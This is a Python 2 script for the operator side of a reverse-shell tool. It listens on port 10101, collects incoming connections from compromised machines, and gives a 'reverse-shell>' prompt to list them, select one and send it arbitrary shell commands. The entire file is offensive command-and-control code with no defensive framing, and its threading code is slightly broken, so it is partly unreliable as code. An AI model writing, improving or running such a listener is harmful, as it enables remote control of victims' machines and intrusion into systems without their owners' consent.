#!/usr/bin/python

import socket
import threading
import sys


class Server(object):
    sckt = None
    addresses = []
    connections = []

    def start(self):
        print("Starting server...")
        self.create_socket()
        self.create_threads()

    def create_socket(self):
        print("Configuring socket...")
        try:
            self.sckt = socket.socket()
            self.sckt.bind(("", 10101))
            self.sckt.listen(5)
        except socket.error as message:
            print(message)
            sys.exit()

    def create_threads(self):
        print("Creating threads...")
        for number in range(2):
            thread = None
            if number == 0:
                thread = threading.Thread(target=self.accept_connections)
            elif number == 1:
                thread = threading.Thread(target=self.show_prompt())
            thread.daemon = True
            thread.start()

    def accept_connections(self):
        connection, address = self.sckt.accept()
        self.connections.append(connection)
        self.addresses.append(address)

    def show_prompt(self):
        while True:
            command = raw_input("\nreverse-shell> ")
            if command == "quit":
                self.close_connections()
                break
            elif command == "list":
                self.show_connections()
            elif command[:6] == "select":
                if self.error_check_for_send_commands(command[7:]):
                    self.send_commands(int(command[7:]))
            else:
                print("\n- command not recognized")

    def remove_connection(self, index):
        del self.addresses[index]
        del self.connections[index]

    def show_connections(self):
        print("---------- Connections ----------")
        for index, address in enumerate(self.addresses):
            try:
                self.connections[index].send("?")
                self.connections[index].recv(1024)
            except socket.error:
                self.remove_connection(index)
                continue
            print(str(index) + (" " * 10) + address[0] + (" " * 10) + str(address[1]))
        if len(self.connections) == 0:
            print("    no available connections")

    def send_commands(self, index):
        print("")
        while True:
            command = raw_input(self.addresses[index][0] + "> ")
            if command == "done":
                break
            elif len(command) > 0:
                try:
                    self.connections[index].send(command)
                    response = str(self.connections[index].recv(1024))
                    print(response)
                except socket.error:
                    print("\n - error: lost connection")
                    break

    def error_check_for_send_commands(self, argument):
        if not argument.isdigit():
            print("\n- " + argument + " is not a number")
            return False
        index = int(argument)
        if index >= len(self.connections):
            print("\n- connection " + str(index) + " is not an available connection")
            print("- use command 'list' to see all available connections")
            return False
        elif self.connections[index] is None:
            print("\n- connection " + str(index) + " is no longer available")
            print("- use command 'list' to see all available connections")
            self.remove_connection(index)
            return False
        return True

    def close_connections(self):
        for connection in self.connections:
            connection.close()
        self.sckt.close()


def main():
    server = Server()
    server.start()


if __name__ == "__main__":
    main()
